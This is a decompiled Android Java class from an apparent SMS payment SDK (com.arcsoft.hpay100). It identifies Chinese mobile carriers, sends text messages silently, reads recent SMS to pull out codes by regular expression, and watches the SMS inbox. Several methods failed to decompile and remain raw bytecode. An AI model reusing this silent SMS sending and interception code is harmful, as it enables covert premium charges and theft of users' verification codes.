package com.arcsoft.hpay100.c;

import android.content.ContentResolver;
import android.content.Context;
import android.net.Uri;
import android.os.Handler;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import com.arcsoft.hpay100.a.a;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public final class b
{
  private static com.arcsoft.hpay100.config.b a = null;

  public static int a(Context paramContext)
  {
    try
    {
      TelephonyManager localTelephonyManager = (TelephonyManager)paramContext.getSystemService("phone");
      if (localTelephonyManager == null)
        return -1;
      if (localTelephonyManager.getSimState() == 5)
      {
        String str1 = localTelephonyManager.getSimOperator();
        String str2 = localTelephonyManager.getSimSerialNumber();
        if ((str2 != null) && (str2.trim().length() > 0))
          str2 = str2.substring(0, 6);
        if (("46000".equals(str1)) || ("46002".equals(str1)) || ("46007".equals(str1)) || ("898600".equals(str2)))
          break label182;
        if (("46001".equals(str1)) || ("46006".equals(str1)))
          break label186;
        if ((!"46003".equals(str1)) && (!"46005".equals(str1)))
        {
          boolean bool = "46011".equals(str1);
          if (!bool);
        }
        else
        {
          i = 3;
          break label184;
        }
        i = -1;
      }
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
      i = -1;
    }
    label182: label184: label186: for (int i = 1; ; i = 2)
      return i;
  }

  // ERROR //
  public static String a(Context paramContext, String paramString)
  {
    // Byte code:
    //   0: ldc 74
    //   2: invokestatic 80	android/net/Uri:parse	(Ljava/lang/String;)Landroid/net/Uri;
    //   5: astore 8
    //   7: iconst_4
    //   8: anewarray 36	java/lang/String
    //   11: dup
    //   12: iconst_0
    //   13: ldc 82
    //   15: aastore
    //   16: dup
    //   17: iconst_1
    //   18: ldc 84
    //   20: aastore
    //   21: dup
    //   22: iconst_2
    //   23: ldc 86
    //   25: aastore
    //   26: dup
    //   27: iconst_3
    //   28: ldc 88
    //   30: aastore
    //   31: astore 9
    //   33: aload_0
    //   34: invokevirtual 92	android/content/Context:getContentResolver	()Landroid/content/ContentResolver;
    //   37: aload 8
    //   39: aload 9
    //   41: new 94	java/lang/StringBuilder
    //   44: dup
    //   45: ldc 96
    //   47: invokespecial 100	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   50: invokestatic 106	java/lang/System:currentTimeMillis	()J
    //   53: ldc2_w 107
    //   56: lsub
    //   57: invokevirtual 112	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   60: invokevirtual 115	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   63: aconst_null
    //   64: ldc 117
    //   66: invokevirtual 123	android/content/ContentResolver:query	(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   69: astore 10
    //   71: aload 10
    //   73: astore_3
    //   74: ldc 125
    //   76: new 94	java/lang/StringBuilder
    //   79: dup
    //   80: ldc 127
    //   82: invokespecial 100	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   85: aload_3
    //   86: invokeinterface 132 1 0
    //   91: invokevirtual 135	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   94: invokevirtual 115	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   97: invokestatic 141	com/arcsoft/hpay100/a/a:b	(Ljava/lang/String;Ljava/lang/String;)V
    //   100: aload_3
    //   101: ifnull +216 -> 317
    //   104: aload_3
    //   105: invokeinterface 132 1 0
    //   110: ifle +207 -> 317
    //   113: aload_3
    //   114: invokeinterface 145 1 0
    //   119: ifeq +198 -> 317
    //   122: aload_3
    //   123: aload_3
    //   124: ldc 88
    //   126: invokeinterface 149 2 0
    //   131: invokeinterface 153 2 0
    //   136: ldc 155
    //   138: ldc 157
    //   140: invokevirtual 161	java/lang/String:replaceAll	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   143: astore 12
    //   145: ldc 125
    //   147: new 94	java/lang/StringBuilder
    //   150: dup
    //   151: ldc 163
    //   153: invokespecial 100	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   156: aload 12
    //   158: invokevirtual 166	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   161: invokevirtual 115	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   164: invokestatic 141	com/arcsoft/hpay100/a/a:b	(Ljava/lang/String;Ljava/lang/String;)V
    //   167: aload_1
    //   168: invokestatic 172	android/text/TextUtils:isEmpty	(Ljava/lang/CharSequence;)Z
    //   171: ifeq +51 -> 222
    //   174: aload 12
    //   176: bipush 6
    //   178: invokestatic 175	com/arcsoft/hpay100/c/b:a	(Ljava/lang/String;I)Ljava/lang/String;
    //   181: astore 14
    //   183: aload 14
    //   185: astore 6
    //   187: aload_3
    //   188: ifnull +9 -> 197
    //   191: aload_3
    //   192: invokeinterface 178 1 0
    //   197: ldc 125
    //   199: new 94	java/lang/StringBuilder
    //   202: dup
    //   203: ldc 180
    //   205: invokespecial 100	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   208: aload 6
    //   210: invokevirtual 166	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   213: invokevirtual 115	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   216: invokestatic 141	com/arcsoft/hpay100/a/a:b	(Ljava/lang/String;Ljava/lang/String;)V
    //   219: aload 6
    //   221: areturn
    //   222: aload 12
    //   224: aload_1
    //   225: invokestatic 182	com/arcsoft/hpay100/c/b:b	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   228: astore 13
    //   230: aload 13
    //   232: astore 6
    //   234: goto -47 -> 187
    //   237: astore 5
    //   239: aconst_null
    //   240: astore_3
    //   241: aload 5
    //   243: invokevirtual 71	java/lang/Exception:printStackTrace	()V
    //   246: ldc 184
    //   248: astore 6
    //   250: aload_3
    //   251: ifnull -54 -> 197
    //   254: aload_3
    //   255: invokeinterface 178 1 0
    //   260: goto -63 -> 197
    //   263: astore 7
    //   265: aload 7
    //   267: invokevirtual 71	java/lang/Exception:printStackTrace	()V
    //   270: goto -73 -> 197
    //   273: astore_2
    //   274: aconst_null
    //   275: astore_3
    //   276: aload_3
    //   277: ifnull +9 -> 286
    //   280: aload_3
    //   281: invokeinterface 178 1 0
    //   286: aload_2
    //   287: athrow
    //   288: astore 4
    //   290: aload 4
    //   292: invokevirtual 71	java/lang/Exception:printStackTrace	()V
    //   295: goto -9 -> 286
    //   298: astore 11
    //   300: aload 11
    //   302: invokevirtual 71	java/lang/Exception:printStackTrace	()V
    //   305: goto -108 -> 197
    //   308: astore_2
    //   309: goto -33 -> 276
    //   312: astore 5
    //   314: goto -73 -> 241
    //   317: ldc 184
    //   319: astore 6
    //   321: goto -134 -> 187
    //
    // Exception table:
    //   from	to	target	type
    //   0	71	237	java/lang/Exception
    //   254	260	263	java/lang/Exception
    //   0	71	273	finally
    //   280	286	288	java/lang/Exception
    //   191	197	298	java/lang/Exception
    //   74	100	308	finally
    //   104	183	308	finally
    //   222	230	308	finally
    //   241	246	308	finally
    //   74	100	312	java/lang/Exception
    //   104	183	312	java/lang/Exception
    //   222	230	312	java/lang/Exception
  }

  // ERROR //
  private static String a(String paramString, int paramInt)
  {
    // Byte code:
    //   0: new 94	java/lang/StringBuilder
    //   3: dup
    //   4: ldc 186
    //   6: invokespecial 100	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   9: ldc 188
    //   11: invokevirtual 166	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   14: invokevirtual 115	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   17: invokestatic 194	java/util/regex/Pattern:compile	(Ljava/lang/String;)Ljava/util/regex/Pattern;
    //   20: aload_0
    //   21: invokevirtual 198	java/util/regex/Pattern:matcher	(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;
    //   24: astore 5
    //   26: ldc 184
    //   28: astore_3
    //   29: aload 5
    //   31: invokevirtual 203	java/util/regex/Matcher:find	()Z
    //   34: ifne +5 -> 39
    //   37: aload_3
    //   38: areturn
    //   39: aload 5
    //   41: invokevirtual 206	java/util/regex/Matcher:group	()Ljava/lang/String;
    //   44: astore 6
    //   46: aload 6
    //   48: astore_3
    //   49: goto -20 -> 29
    //   52: astore_2
    //   53: ldc 184
    //   55: astore_3
    //   56: aload_2
    //   57: astore 4
    //   59: aload 4
    //   61: invokevirtual 71	java/lang/Exception:printStackTrace	()V
    //   64: aload_3
    //   65: areturn
    //   66: astore 4
    //   68: goto -9 -> 59
    //
    // Exception table:
    //   from	to	target	type
    //   0	26	52	java/lang/Exception
    //   29	37	66	java/lang/Exception
    //   39	46	66	java/lang/Exception
  }

  public static void a(String paramString1, String paramString2)
  {
    if ((TextUtils.isEmpty(paramString1)) || (TextUtils.isEmpty(paramString2)));
    SmsManager localSmsManager;
    while (true)
    {
      return;
      try
      {
        localSmsManager = SmsManager.getDefault();
        if (paramString2.length() <= 70)
          break;
        Iterator localIterator = localSmsManager.divideMessage(paramString2).iterator();
        while (localIterator.hasNext())
        {
          String str = (String)localIterator.next();
          localSmsManager.sendTextMessage(paramString1, null, str, null, null);
          a.b("dalongTest", "sms address:" + paramString1);
          a.b("dalongTest", "sms content:" + str);
        }
      }
      catch (Exception localException)
      {
        localException.printStackTrace();
        return;
      }
    }
    localSmsManager.sendTextMessage(paramString1, null, paramString2, null, null);
    a.b("dalongTest", "sms address--:" + paramString1);
    a.b("dalongTest", "sms content--:" + paramString2);
  }

  public static boolean a(String paramString)
  {
    if ((TextUtils.isEmpty(paramString)) || (paramString.length() != 11))
      return false;
    try
    {
      boolean bool = Pattern.compile("^((13\\d)|14[5,7]|(15[\\d&&[^4]])|17[0,6,7,8]|(18\\d))\\d{8}$").matcher(paramString).matches();
      return bool;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
    return false;
  }

  public static String b(String paramString)
  {
    try
    {
      if ((!TextUtils.isEmpty(paramString)) && (paramString.length() >= 11))
      {
        int i = paramString.indexOf("1");
        localObject = paramString.substring(i, i + 11);
        if (((String)localObject).startsWith("+86"))
        {
          String str = ((String)localObject).substring(3);
          localObject = str;
        }
      }
      while (true)
      {
        a.b("dalongTest", "getProcessPhone:" + (String)localObject);
        return localObject;
        if (!((String)localObject).startsWith("86"))
          continue;
        localObject = ((String)localObject).substring(2);
        continue;
        localObject = "";
      }
    }
    catch (Exception localException)
    {
      while (true)
      {
        localException.printStackTrace();
        Object localObject = "";
      }
    }
  }

  // ERROR //
  public static String b(String paramString1, String paramString2)
  {
    // Byte code:
    //   0: ldc 125
    //   2: new 94	java/lang/StringBuilder
    //   5: dup
    //   6: ldc_w 268
    //   9: invokespecial 100	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   12: aload_1
    //   13: invokevirtual 166	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   16: invokevirtual 115	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   19: invokestatic 141	com/arcsoft/hpay100/a/a:b	(Ljava/lang/String;Ljava/lang/String;)V
    //   22: aload_1
    //   23: invokestatic 172	android/text/TextUtils:isEmpty	(Ljava/lang/CharSequence;)Z
    //   26: ifeq +58 -> 84
    //   29: ldc_w 270
    //   32: invokestatic 194	java/util/regex/Pattern:compile	(Ljava/lang/String;)Ljava/util/regex/Pattern;
    //   35: astore 6
    //   37: aload 6
    //   39: aload_0
    //   40: invokevirtual 198	java/util/regex/Pattern:matcher	(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;
    //   43: astore 7
    //   45: ldc 184
    //   47: astore_3
    //   48: aload 7
    //   50: invokevirtual 203	java/util/regex/Matcher:find	()Z
    //   53: istore 8
    //   55: iload 8
    //   57: ifne +40 -> 97
    //   60: ldc 125
    //   62: new 94	java/lang/StringBuilder
    //   65: dup
    //   66: ldc_w 272
    //   69: invokespecial 100	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   72: aload_3
    //   73: invokevirtual 166	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   76: invokevirtual 115	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   79: invokestatic 141	com/arcsoft/hpay100/a/a:b	(Ljava/lang/String;Ljava/lang/String;)V
    //   82: aload_3
    //   83: areturn
    //   84: aload_1
    //   85: invokestatic 194	java/util/regex/Pattern:compile	(Ljava/lang/String;)Ljava/util/regex/Pattern;
    //   88: astore 5
    //   90: aload 5
    //   92: astore 6
    //   94: goto -57 -> 37
    //   97: aload 7
    //   99: invokevirtual 206	java/util/regex/Matcher:group	()Ljava/lang/String;
    //   102: astore 9
    //   104: aload 9
    //   106: astore_3
    //   107: goto -59 -> 48
    //   110: astore_2
    //   111: ldc 184
    //   113: astore_3
    //   114: aload_2
    //   115: astore 4
    //   117: aload 4
    //   119: invokevirtual 71	java/lang/Exception:printStackTrace	()V
    //   122: goto -62 -> 60
    //   125: astore 4
    //   127: goto -10 -> 117
    //
    // Exception table:
    //   from	to	target	type
    //   0	37	110	java/lang/Exception
    //   37	45	110	java/lang/Exception
    //   84	90	110	java/lang/Exception
    //   48	55	125	java/lang/Exception
    //   97	104	125	java/lang/Exception
  }

  public static boolean b(Context paramContext)
  {
    return 1 == a(paramContext);
  }

  public static boolean c(Context paramContext)
  {
    if ((paramContext == null) || (paramContext.checkCallingOrSelfPermission("android.permission.SEND_SMS") != 0))
      return false;
    switch (((TelephonyManager)paramContext.getSystemService("phone")).getSimState())
    {
    default:
      return false;
    case 0:
    case 1:
    case 2:
    case 3:
    case 4:
      return false;
    case 5:
    }
    return true;
  }

  public static void d(Context paramContext)
  {
    try
    {
      a = new com.arcsoft.hpay100.config.b(new Handler(), paramContext);
      Uri localUri = Uri.parse("content://sms");
      paramContext.getApplicationContext().getContentResolver().registerContentObserver(localUri, true, a);
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }
}

/* Location:           E:\Progs\Dev\Android\Decompile\apktool\zssq\zssq-dex2jar.jar
 * Qualified Name:     com.arcsoft.hpay100.c.b
 * JD-Core Version:    0.6.0
 */